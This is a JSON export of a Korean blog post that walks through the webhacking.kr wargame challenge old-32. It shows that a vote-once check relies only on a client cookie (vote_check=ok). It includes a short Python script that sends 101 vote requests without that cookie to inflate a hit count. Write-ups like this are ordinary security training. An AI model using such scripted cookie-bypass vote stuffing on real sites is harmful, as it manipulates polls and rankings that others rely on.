@@ -1,0 +1,346 @@
+{
+  "format": "yt010108-published-post",
+  "version": 1,
+  "id": "641c59ec-f85c-5f8f-ac54-fc6e5586be07",
+  "kind": "posts",
+  "title": "[webhacking.kr]  old-32 문제",
+  "slug": "tistory-42",
+  "description": "1. 문제 정보문제 번호 : old -32문제 점수 : 15점2. 문제 분석 들어가면 HIT 랭킹표가 나온다. 닉네임을 클릭하면 이미 투표했다고 나온다.버프스위트로 패킷을 조사하면 cookie에 vote_check값이 ok이 되어있다. vote_check을 바꿔서 투표를 해보자 3. 풀이 cookie값을 빈칸으로 제출했을 때 투표가 성공하고 hit값이 증가한다. 하지만 성공했다고 안뜬다. hit가 100번까지 있으므로 자기 이름으로 100번 넘게 hit를 요청하면 성공한다.import requestsurl = \"https://webhacking.kr/challenge/code-5/\"params = {\"hit\": \"내_닉네임\"} # 본인의 닉네임 입력cookies = {\"PHPSESSID\": \"내_세션..",
+  "category": "Wargame / webhacking.kr",
+  "date": "2026-01-20",
+  "tags": [],
+  "status": "published",
+  "trashedAt": null,
+  "publishedAt": "2026-01-20T19:28:35+09:00",
+  "updatedAt": "2026-01-20T21:05:28+09:00",
+  "sourceDigest": "ed9e36fd98824e895b4ac1c103ed5965d4777abb551e15bb3d10a3dd3aa6105a",
+  "assets": [
+    {
+      "id": "79036c63-d326-57d9-85dd-37cece6ed05b",
+      "name": "tistory-42-79036c63-d326-57d9-85dd-37cece6ed05b.png",
+      "type": "image/png",
+      "path": "/assets/uploads/641c59ec-f85c-5f8f-ac54-fc6e5586be07/79036c63-d326-57d9-85dd-37cece6ed05b.png",
+      "sha": "a4231453d3cd44beea999c92bade2a6091ee7cb5"
+    },
+    {
+      "id": "74f2fb4e-2eac-5e9e-908e-8c0bf33076fd",
+      "name": "tistory-42-74f2fb4e-2eac-5e9e-908e-8c0bf33076fd.png",
+      "type": "image/png",
+      "path": "/assets/uploads/641c59ec-f85c-5f8f-ac54-fc6e5586be07/74f2fb4e-2eac-5e9e-908e-8c0bf33076fd.png",
+      "sha": "47e98e315c640f7ce8a641ccc751cb2097a22af5"
+    },
+    {
+      "id": "91ac40f7-7652-5180-9699-bbbd8863d62b",
+      "name": "tistory-42-91ac40f7-7652-5180-9699-bbbd8863d62b.png",
+      "type": "image/png",
+      "path": "/assets/uploads/641c59ec-f85c-5f8f-ac54-fc6e5586be07/91ac40f7-7652-5180-9699-bbbd8863d62b.png",
+      "sha": "d226367e619f019deb8e75f9850f677fdf99c350"
+    },
+    {
+      "id": "67b01f63-1f1b-5db7-886b-435f083c3469",
+      "name": "tistory-42-67b01f63-1f1b-5db7-886b-435f083c3469.png",
+      "type": "image/png",
+      "path": "/assets/uploads/641c59ec-f85c-5f8f-ac54-fc6e5586be07/67b01f63-1f1b-5db7-886b-435f083c3469.png",
+      "sha": "47556a70ec45acab4f6bf684fb3145d4b27b31da"
+    },
+    {
+      "id": "29dc8bd8-ce66-5ebd-9a55-28c9ea0fe342",
+      "name": "tistory-42-29dc8bd8-ce66-5ebd-9a55-28c9ea0fe342.png",
+      "type": "image/png",
+      "path": "/assets/uploads/641c59ec-f85c-5f8f-ac54-fc6e5586be07/29dc8bd8-ce66-5ebd-9a55-28c9ea0fe342.png",
+      "sha": "40712e836c5c6caff84ef8c19e8f9fbff489f3a8"
+    },
+    {
+      "id": "246659f4-6f1e-5c85-8e94-ed84245e34e9",
+      "name": "tistory-42-246659f4-6f1e-5c85-8e94-ed84245e34e9.png",
+      "type": "image/png",
+      "path": "/assets/uploads/641c59ec-f85c-5f8f-ac54-fc6e5586be07/246659f4-6f1e-5c85-8e94-ed84245e34e9.png",
+      "sha": "56bd484095757d04facf4664316363e314b6b7d1"
+    }
+  ],
+  "doc": {
+    "type": "doc",
+    "content": [
+      {
+        "type": "image",
+        "attrs": {
+          "assetId": "79036c63-d326-57d9-85dd-37cece6ed05b",
+          "src": "/assets/uploads/641c59ec-f85c-5f8f-ac54-fc6e5586be07/79036c63-d326-57d9-85dd-37cece6ed05b.png",
+          "alt": "",
+          "title": null
+        }
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 2
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "1. 문제 정보"
+          }
+        ]
+      },
+      {
+        "type": "bulletList",
+        "content": [
+          {
+            "type": "listItem",
+            "content": [
+              {
+                "type": "paragraph",
+                "content": [
+                  {
+                    "type": "text",
+                    "text": "문제 번호 : old -32"
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "listItem",
+            "content": [
+              {
+                "type": "paragraph",
+                "content": [
+                  {
+                    "type": "text",
+                    "text": "문제 점수 : 15점"
+                  }
+                ]
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "type": "horizontalRule"
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 2
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "2. 문제 분석"
+          }
+        ]
+      },
+      {
+        "type": "image",
+        "attrs": {
+          "assetId": "74f2fb4e-2eac-5e9e-908e-8c0bf33076fd",
+          "src": "/assets/uploads/641c59ec-f85c-5f8f-ac54-fc6e5586be07/74f2fb4e-2eac-5e9e-908e-8c0bf33076fd.png",
+          "alt": "",
+          "title": null
+        }
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "들어가면 HIT 랭킹표가 나온다. 닉네임을 클릭하면 이미 투표했다고 나온다."
+          }
+        ]
+      },
+      {
+        "type": "image",
+        "attrs": {
+          "assetId": "91ac40f7-7652-5180-9699-bbbd8863d62b",
+          "src": "/assets/uploads/641c59ec-f85c-5f8f-ac54-fc6e5586be07/91ac40f7-7652-5180-9699-bbbd8863d62b.png",
+          "alt": "",
+          "title": null
+        }
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "버프스위트로 패킷을 조사하면 cookie에 vote_check값이 ok이 되어있다. vote_check을 바꿔서 투표를 해보자"
+          }
+        ]
+      },
+      {
+        "type": "image",
+        "attrs": {
+          "assetId": "67b01f63-1f1b-5db7-886b-435f083c3469",
+          "src": "/assets/uploads/641c59ec-f85c-5f8f-ac54-fc6e5586be07/67b01f63-1f1b-5db7-886b-435f083c3469.png",
+          "alt": "",
+          "title": null
+        }
+      },
+      {
+        "type": "horizontalRule"
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 2
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "3. 풀이"
+          }
+        ]
+      },
+      {
+        "type": "image",
+        "attrs": {
+          "assetId": "29dc8bd8-ce66-5ebd-9a55-28c9ea0fe342",
+          "src": "/assets/uploads/641c59ec-f85c-5f8f-ac54-fc6e5586be07/29dc8bd8-ce66-5ebd-9a55-28c9ea0fe342.png",
+          "alt": "",
+          "title": null
+        }
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "cookie값을 빈칸으로 제출했을 때 투표가 성공하고 hit값이 증가한다. 하지만 성공했다고 안뜬다."
+          }
+        ]
+      },
+      {
+        "type": "image",
+        "attrs": {
+          "assetId": "74f2fb4e-2eac-5e9e-908e-8c0bf33076fd",
+          "src": "/assets/uploads/641c59ec-f85c-5f8f-ac54-fc6e5586be07/74f2fb4e-2eac-5e9e-908e-8c0bf33076fd.png",
+          "alt": "",
+          "title": null
+        }
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "hit가 100번까지 있으므로"
+          }
+        ]
+      },
+      {
+        "type": "paragraph",
+        "content": [
+          {
+            "type": "text",
+            "text": "자기 이름으로 100번 넘게 hit를 요청하면 성공한다."
+          }
+        ]
+      },
+      {
+        "type": "codeBlock",
+        "attrs": {
+          "language": "php"
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "import requests\n\nurl = \"https://webhacking.kr/challenge/code-5/\"\nparams = {\"hit\": \"내_닉네임\"} # 본인의 닉네임 입력\ncookies = {\"PHPSESSID\": \"내_세션_ID\"} # 로그인 세션 ID\n\n# 100번 반복 투표 수행\nfor i in range(101):\n    # vote_check 쿠키를 제외하고 요청을 보냄\n    response = requests.get(url, params=params, cookies=cookies)\n    print(f\"{i}번째 투표 완료: {response.status_code}\")"
+          }
+        ]
+      },
+      {
+        "type": "image",
+        "attrs": {
+          "assetId": "246659f4-6f1e-5c85-8e94-ed84245e34e9",
+          "src": "/assets/uploads/641c59ec-f85c-5f8f-ac54-fc6e5586be07/246659f4-6f1e-5c85-8e94-ed84245e34e9.png",
+          "alt": "",
+          "title": null
+        }
+      },
+      {
+        "type": "horizontalRule"
+      },
+      {
+        "type": "heading",
+        "attrs": {
+          "level": 2
+        },
+        "content": [
+          {
+            "type": "text",
+            "text": "4. 요약"
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      },
+      {
+        "type": "bulletList",
+        "content": [
+          {
+            "type": "listItem",
+            "content": [
+              {
+                "type": "paragraph",
+                "content": [
+                  {
+                    "type": "text",
+                    "text": "투표 시 vote_check=ok라는 쿠키가 생성되어 중복 투표를 막는 것을 확인했다."
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "listItem",
+            "content": [
+              {
+                "type": "paragraph",
+                "content": [
+                  {
+                    "type": "text",
+                    "text": "이 쿠키를 삭제하거나 변조하면 중복 투표가 가능하다는 취약점을 발견했다."
+                  }
+                ]
+              }
+            ]
+          },
+          {
+            "type": "listItem",
+            "content": [
+              {
+                "type": "paragraph",
+                "content": [
+                  {
+                    "type": "text",
+                    "text": "파이썬 스크립트를 통해 vote_check 쿠키 없이 100번 요청을 보내 점수를 채우고 해결했다."
+                  }
+                ]
+              }
+            ]
+          }
+        ]
+      },
+      {
+        "type": "paragraph"
+      }
+    ]
+  },
+  "source": {
+    "platform": "tistory",
+    "url": "https://yt5246.tistory.com/42",
+    "originalId": "42",
+    "publishedAt": "2026-01-20T19:28:35+09:00",
+    "updatedAt": "2026-01-20T21:05:28+09:00",
+    "importedAt": "2026-10-25T14:17:38+09:00"
+  }
+}
